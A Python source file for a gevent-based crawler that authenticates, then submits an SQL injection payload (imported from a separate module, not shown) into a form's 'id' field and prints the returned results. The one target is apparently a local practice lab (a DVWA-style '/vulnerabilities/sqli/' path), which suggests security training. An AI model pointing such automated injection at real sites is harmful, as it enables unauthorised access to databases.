import gevent
import gevent.monkey

gevent.monkey.patch_all()

import injections
from storage.Storage import Storage
from auth import Auth


class Crawler:
    browser = None

    def __init(self):
        storage = Storage()
        self.storage = storage.storage

    def run(self):
        auth = Auth()
        self.browser = auth.authenticate()

        jobs = [gevent.spawn(self.inject, url) for url in self.get_scrape_urls()]
        gevent.wait(jobs)

    def inject(self, url):
        self.browser.open(url)
        form = self.browser.select_form('form')
        form['id'] = injections.DATABASE_USERNAME

        self.browser.submit_selected()
        # we assume that the presence of `pre` tag means we got some results
        results = self.browser.get_current_page().select('pre')

        for result in results:
            print(result)

    @staticmethod
    def get_scrape_urls():
        """
        This can be retrieve from a storage engine or from a
        configuration file
        :return:
        """
        return [
            'http://localhost:11985/vulnerabilities/sqli/'
        ]
